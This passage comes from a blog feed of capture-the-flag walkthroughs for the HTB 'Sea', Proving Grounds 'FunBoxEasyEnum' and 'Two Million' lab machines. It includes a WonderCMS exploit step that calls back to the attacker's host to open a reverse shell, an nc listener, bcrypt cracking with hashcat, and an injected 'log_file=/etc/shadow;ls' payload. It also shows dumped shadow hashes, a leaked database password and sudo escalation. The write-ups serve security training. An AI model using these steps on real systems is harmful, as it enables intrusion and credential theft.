+|_  <span style="color:#ae81ff">256</span> 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-title: Sea - Home
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.68 seconds
+
+</code></pre></div><p><img src="attachment/bf6ff779445168f6914732ee9f3785f9.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://sea.htb/FUZZ  -mc 200,301,302
+
+        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://sea.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : <span style="color:#ae81ff">10</span>
+ :: Threads          : <span style="color:#ae81ff">40</span>
+ :: Matcher          : Response status: 200,301,302
+________________________________________________
+
+<span style="color:#75715e"># directory-list-2.3-medium.txt [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 51ms]</span>
+home                    <span style="color:#f92672">[</span>Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 50ms<span style="color:#f92672">]</span>
+<span style="color:#ae81ff">0</span>                       <span style="color:#f92672">[</span>Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 45ms<span style="color:#f92672">]</span>
+themes                  <span style="color:#f92672">[</span>Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 43ms<span style="color:#f92672">]</span>
+data                    <span style="color:#f92672">[</span>Status: 301, Size: 228, Words: 14, Lines: 8, Duration: 42ms<span style="color:#f92672">]</span>
+plugins                 <span style="color:#f92672">[</span>Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 43ms<span style="color:#f92672">]</span>
+
+</code></pre></div><p>All endpoints are forbidden</p>
+<p><img src="attachment/b101fa38d06f5fbb4be25ccc65f7175b.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">wget http://sea.htb/themes/bike/README.md                                       
+--2024-08-13 05:23:28--  http://sea.htb/themes/bike/README.md
+Resolving sea.htb <span style="color:#f92672">(</span>sea.htb<span style="color:#f92672">)</span>... 10.129.111.77
+Connecting to sea.htb <span style="color:#f92672">(</span>sea.htb<span style="color:#f92672">)</span>|10.129.111.77|:80... connected.
+HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+Length: <span style="color:#ae81ff">318</span> <span style="color:#f92672">[</span>text/markdown<span style="color:#f92672">]</span>
+Saving to: ‘README.md’
+
+README.md                        100%<span style="color:#f92672">[==========================================================</span>&gt;<span style="color:#f92672">]</span>     <span style="color:#ae81ff">318</span>  --.-KB/s    in 0s      
+
+2024-08-13 05:23:28 <span style="color:#f92672">(</span>52.1 MB/s<span style="color:#f92672">)</span> - ‘README.md’ saved <span style="color:#f92672">[</span>318/318<span style="color:#f92672">]</span>
+
+</code></pre></div><p>WGET README.md and LICENSE and analyze content, it says is used WonderCMS</p>
+<p><img src="attachment/72b505acf6cc17aeff4fafb3135dacfb.png" alt=""></p>
+<p>Looking online found: <a href="https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413">CVE-2023-41425 (WonderCMS Remote Code Execution) - PoC</a>
+<img src="attachment/bafc9212737fc47089cd6101baff47f0.png" alt=""></p>
+<pre><code>Clone the repo and try. After talking with others on discord
+</code></pre>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://sea.htb/themes/revshell-main/rev.php?lhost<span style="color:#f92672">=</span>10.10.14.126&amp;lport<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span>
+</code></pre></div><p><img src="attachment/ef1268efe149e6fffec7386597207bb3.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cd /var/www/sea
+$ cd sea
+$ ls
+contact.php
+data
+index.php
+messages
+plugins
+themes
+$ cd data
+$ ls
+cache.json
+database.js
+files
+$ cat database.js
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;config&#34;</span>: <span style="color:#f92672">{</span>
+        <span style="color:#e6db74">&#34;siteTitle&#34;</span>: <span style="color:#e6db74">&#34;Sea&#34;</span>,
+        <span style="color:#e6db74">&#34;theme&#34;</span>: <span style="color:#e6db74">&#34;bike&#34;</span>,
+        <span style="color:#e6db74">&#34;defaultPage&#34;</span>: <span style="color:#e6db74">&#34;home&#34;</span>,
+        <span style="color:#e6db74">&#34;login&#34;</span>: <span style="color:#e6db74">&#34;loginURL&#34;</span>,
+        <span style="color:#e6db74">&#34;forceLogout&#34;</span>: false,
+        <span style="color:#e6db74">&#34;forceHttps&#34;</span>: false,
+        <span style="color:#e6db74">&#34;saveChangesPopup&#34;</span>: false,
+        <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;</span>$2<span style="color:#e6db74">y</span>$10$iOrk210RQSAzNCx6Vyq2X<span style="color:#e6db74">.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q&#34;</span>,
+        <span style="color:#e6db74">&#34;lastLogins&#34;</span>: <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;2024\/08\/13 18:10:26&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+            <span style="color:#e6db74">&#34;2024\/08\/13 18:09:26&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+            <span style="color:#e6db74">&#34;2024\/08\/13 18:09:25&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+            <span style="color:#e6db74">&#34;2024\/08\/13 18:08:25&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,
+            <span style="color:#e6db74">&#34;2024\/08\/13 18:07:25&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>
+        <span style="color:#f92672">}</span>,
+
+
+</code></pre></div><p>Fix the hash provided removing the escapes obtaining this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sea<span style="color:#f92672">]</span>
+└─$ hashcat hash.txt -m <span style="color:#ae81ff">3200</span> /usr/share/wordlists/rockyou.txt
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: <span style="color:#ae81ff">3200</span> <span style="color:#f92672">(</span>bcrypt $2*$, Blowfish <span style="color:#f92672">(</span>Unix<span style="color:#f92672">))</span>
+Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
+Time.Started.....: Wed Aug <span style="color:#ae81ff">14</span> 06:21:53 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">46</span> secs<span style="color:#f92672">)</span>
+Time.Estimated...: Wed Aug <span style="color:#ae81ff">14</span> 06:22:39 <span style="color:#ae81ff">2024</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt<span style="color:#f92672">)</span>
+Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
+Speed.#1.........:       <span style="color:#ae81ff">67</span> H/s <span style="color:#f92672">(</span>6.72ms<span style="color:#f92672">)</span> @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>
+Progress.........: 3072/14344384 <span style="color:#f92672">(</span>0.02%<span style="color:#f92672">)</span>
+Rejected.........: 0/3072 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
+Restore.Point....: 3056/14344384 <span style="color:#f92672">(</span>0.02%<span style="color:#f92672">)</span>
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: <span style="color:#ae81ff">753159</span> -&gt; dangerous
+Hardware.Mon.#1..: Util: 88%
+
+Started: Wed Aug <span style="color:#ae81ff">14</span> 06:21:13 <span style="color:#ae81ff">2024</span>
+Stopped: Wed Aug <span style="color:#ae81ff">14</span> 06:22:41 <span style="color:#ae81ff">2024</span>
+
+</code></pre></div><p><img src="attachment/4b8223e56cbf8a23659153d34599548d.png" alt=""></p>
+<p>Try this password in ssh with one of these two users:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/HTB/Sea<span style="color:#f92672">]</span>
+└─$ nc -lnvp <span style="color:#ae81ff">4444</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.126<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.166.185<span style="color:#f92672">]</span> <span style="color:#ae81ff">44840</span>
+Linux sea 5.4.0-190-generic <span style="color:#75715e">#210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 10:25:42 up <span style="color:#ae81ff">41</span> min,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+$ cd /home
+$ ls
+amay
+geo
+
+</code></pre></div><p><img src="attachment/5e7f51c554cca528be1ef76f440f477d.png" alt="">
+Manipulate burp request on http://localhost:8888 after forwarding this port trough ssh from 8080 of the victim</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">log_file<span style="color:#f92672">=</span>/etc/shadow;ls&amp;analyze_log<span style="color:#f92672">=</span>/etc/shadow
+
+root:$6$llVzHhr7xHrvx1wJ$gH0PLbyPaIOqLrpjpzGZbM2bZ/iHaOfv/bj1YRrktVeZ8.1KQ0Jr1Rv/TL/3Qdh84Fwec1UhX2v0LVAGsuzq.0:19775:0:99999:7::: daemon:*:19430:0:99999:7::: bin:*:19430:0:99999:7::: sys:*:19430:0:99999:7::: sync:*:19430:0:99999:7::: games:*:19430:0:99999:7::: man:*:19430:0:99999:7::: lp:*:19430:0:99999:7::: mail:*:19430:0:99999:7::: news:*:19430:0:99999:7::: uucp:*:19430:0:99999:7::: proxy:*:19430:0:99999:7::: www-data:*:19430:0:99999:7::: backup:*:19430:0:99999:7::: list:*:19430:0:99999:7::: irc:*:19430:0:99999:7::: gnats:*:19430:0:99999:7::: nobody:*:19430:0:99999:7::: systemd-network:*:19430:0:99999:7::: systemd-resolve:*:19430:0:99999:7::: systemd-timesync:*:19430:0:99999:7::: messagebus:*:19430:0:99999:7::: syslog:*:19430:0:99999:7::: _apt:*:19430:0:99999:7::: tss:*:19430:0:99999:7::: uuidd:*:19430:0:99999:7::: tcpdump:*:19430:0:99999:7::: landscape:*:19430:0:99999:7::: pollinate:*:19430:0:99999:7::: fwupd-refresh:*:19430:0:99999:7::: usbmux:*:19774:0:99999:7::: sshd:*:19774:0:99999:7::: systemd-coredump:!!:19774:::::: amay:$6$S1AGe5ex2k4D5MKa$gTclSeJwvND3FINpZaK0zfUqk6T9IkhlxCn17fNWLx56u.zP/f/4e5YrJRPsM3TRuuKXQDfYL44RyPzduexsm.:19775:0:99999:7::: lxd:!:19774:::::: geo:$6$5mAIqOze4GJ4s9Zu$P3IgUSHlcCkKpDJ0862IgP5aqaNilEUZDGIm16FiWdxh1A5dfKjmwhMgp3xctHiHZVWGtmKY25cCrILanDPaG.:19934:0:99999:7::: _laurel:!:19936:::::: 
+</code></pre></div><p><img src="attachment/9031cba476e653a6aa5180f76feea642.png" alt=""></p>
+<p>We can get the root flag directly</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">log_file<span style="color:#f92672">=</span>/root/root.txt;ls&amp;analyze_log<span style="color:#f92672">=</span>/root/root.txt
+</code></pre></div><p>**Flags</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">user:459138e5dbf2ead0be8b9c7944a38af7
+root:c58fac10593819ba13ab985ab6389ce0
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>Offensive Security: FunBoxEasyEnum</title>
+            <link>/posts/funboxeasyenum/</link>
+            <pubDate>Thu, 08 Aug 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/funboxeasyenum/</guid>
+            <description>On a lazy Saturday morning, August 17, 2024, I embarked on a thrilling adventure in the world of Offensive Security, tackling the FunboxEasyEnum box on the Proving Grounds Play labs. This easy-level warmup machine was the perfect way to kick-start my journey, and I&amp;rsquo;m excited to share my experience with you.
+Port Scan From port scan we got:
+nmap -sC -sV -A -T4 -p- 192.168.235.132 -o scan Starting Nmap 7.94SVN ( https://nmap.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/93250afd83aff038b608942734b9a111.jpg" alt=""></p>
+<p>On a lazy Saturday morning, August 17, 2024, I embarked on a thrilling adventure in the world of Offensive Security, tackling the FunboxEasyEnum box on the Proving Grounds Play labs. This easy-level warmup machine was the perfect way to kick-start my journey, and I&rsquo;m excited to share my experience with you.</p>
+<h3 id="port-scan">Port Scan</h3>
+<p>From port scan we got:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -sC -sV -A -T4 -p- 192.168.235.132  -o scan 
+Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-14 08:12 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.235.132
+Host is up <span style="color:#f92672">(</span>0.075s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 9c:52:32:5b:8b:f6:38:c7:7f:a1:b7:04:85:49:54:f3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> d6:13:56:06:15:36:24:ad:65:5e:7a:a1:8c:e5:64:f4 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 1b:a9:f3:5a:d0:51:83:18:3a:23:dd:c4:a9:be:59:f0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 43.77 seconds
+
+</code></pre></div><h3 id="enumeration">Enumeration</h3>
+<p>Ran gobuster for directory enumeration:</p>
+<p><img src="attachment/8056c88ec9d48a1a73583502575dc7a7.png" alt=""></p>
+<p>Only /phpmyadmin is accessible
+<img src="attachment/2f1137ed6b04c6e54a3555ea3b74f8bb.png" alt=""></p>
+<p>Analyzing burp request found that /phpmyadmin/js/whitelist.php and /js/messages.php are readable:
+<img src="attachment/0bc35d213b3744dff25955d61e5c3dc7.png" alt=""></p>
+<p>Nothing interesting here, re run enumeration with gobuster filtering for php file:</p>
+<p><img src="attachment/343af38a849df0558dcd46d857f37a9b.png" alt=""></p>
+<p>Try mini.php:</p>
+<p><img src="attachment/4d78da8958ab8e7f54fd207350384649.png" alt=""></p>
+<h3 id="access">Access</h3>
+<p>I uploaded a shell.php while listening on my kali:</p>
+<p><img src="attachment/c776a86f8411bde6fc6f25428c54b0c8.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">lrwxrwxrwx   <span style="color:#ae81ff">1</span> root root        <span style="color:#ae81ff">31</span> Sep <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">2020</span> vmlinuz.old -&gt; boot/vmlinuz-4.15.0-117-generic
+$ cd /var/www/ 
+$ ls
+html
+local.txt
+$ cat local.txt
+896e80f60f8536d18c123448e656a7fc
+$ 
+
+</code></pre></div><p>Found first flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@funbox7:/etc$ cat passwd
+cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+karla:x:1000:1000:karla:/home/karla:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+harry:x:1001:1001:,,,:/home/harry:/bin/bash
+sally:x:1002:1002:,,,:/home/sally:/bin/bash
+goat:x:1003:1003:,,,:/home/goat:/bin/bash
+oracle:$1$|O@GOeN<span style="color:#ae81ff">\$</span>PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+lissy:x:1005:1005::/home/lissy:/bin/sh
+www-data@funbox7:/etc$ 
+
+</code></pre></div><p>There&rsquo;s an hash in passwod</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hashcat -m <span style="color:#ae81ff">500</span> oracle_hash
+found:hiphop
+
+</code></pre></div><p>Regain the revshell and from www-data run sudo su</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">www-data@funbox7:/etc/phpmyadmin$ ls
+ls
+apache.conf    config.footer.inc.php  htpasswd.setup      phpmyadmin.service
+conf.d         config.header.inc.php  lighttpd.conf
+config-db.php  config.inc.php         phpmyadmin.desktop
+www-data@funbox7:/etc/phpmyadmin$ cat config-db.php
+cat config-db.php
+&lt;?php
+<span style="color:#75715e">##</span>
+<span style="color:#75715e">## database access settings in php format</span>
+<span style="color:#75715e">## automatically generated from /etc/dbconfig-common/phpmyadmin.conf</span>
+<span style="color:#75715e">## by /usr/sbin/dbconfig-generate-include</span>
+<span style="color:#75715e">##</span>
+<span style="color:#75715e">## by default this file is managed via ucf, so you shouldn&#39;t have to</span>
+<span style="color:#75715e">## worry about manual changes being silently discarded.  *however*,</span>
+<span style="color:#75715e">## you&#39;ll probably also want to edit the configuration file mentioned</span>
+<span style="color:#75715e">## above too.</span>
+<span style="color:#75715e">##</span>
+$dbuser<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;phpmyadmin&#39;</span>;
+$dbpass<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;tgbzhnujm!&#39;</span>;
+$basepath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
+$dbname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;phpmyadmin&#39;</span>;
+$dbserver<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;localhost&#39;</span>;
+$dbport<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;3306&#39;</span>;
+$dbtype<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mysql&#39;</span>;
+
+</code></pre></div><p>Now we can log in phpmyadmin</p>
+<p><img src="attachment/4f8c1e0352e5cffceb06abbef4a03b5b.png" alt=""></p>
+<pre tabindex="0"><code>sudo su karla:tgbzhnujm! 
+</code></pre><p>Let&rsquo;s see what karla can run</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">karla@funbox7:~$ sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> karla: 
+Matching Defaults entries <span style="color:#66d9ef">for</span> karla on funbox7:
+    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User karla may run the following commands on funbox7:
+    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> ALL
+
+</code></pre></div><p>Run sudo su with its password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">karla@funbox7:~$ sudo su
+root@funbox7:/home/karla# ls
+root@funbox7:/home/karla# cd /root/root.txt
+bash: cd: /root/root.txt: No such file or directory
+root@funbox7:/home/karla# cd /root
+root@funbox7:~# ls
+proof.txt  root.flag
+root@funbox7:~# 
+</code></pre></div><p><img src="attachment/23b8ace2c3ef681dca18c48344780c46.png" alt=""></p>
+<h1 id="flags">Flags</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">local:896e80f60f8536d18c123448e656a7fc
+proof.txt: d0a70330bf49d3799b000cbe3d7ec011
+</code></pre></div>]]></content>
+        </item>
+        
+        <item>
+            <title>HTB: Two Million</title>
+            <link>/posts/two-million/</link>
+            <pubDate>Mon, 05 Aug 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/two-million/</guid>
+            <description># Nmap 7.94SVN scan initiated Sat Aug 10 10:26:58 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan 10.10.11.221 Nmap scan report for 2million.htb (10.10.11.221) Host is up (0.061s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx |_http-title: Hack The Box :: Penetration Testing Labs | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Invite code generation ┌──(kali㉿kali)-[~/HTB] └─$ curl -X POST \  http://2million.</description>
+            <content type="html"><![CDATA[<p><img src="attachment/d8433fa495034cedbcbde285f3a79d68.png" alt=""></p>
+<pre tabindex="0"><code> # Nmap 7.94SVN scan initiated Sat Aug 10 10:26:58 2024 as: nmap -sC -sV -A -T4 -Pn -p- -o scan 10.10.11.221
+Nmap scan report for 2million.htb (10.10.11.221)
+Host is up (0.061s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx
+|_http-title: Hack The Box :: Penetration Testing Labs
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
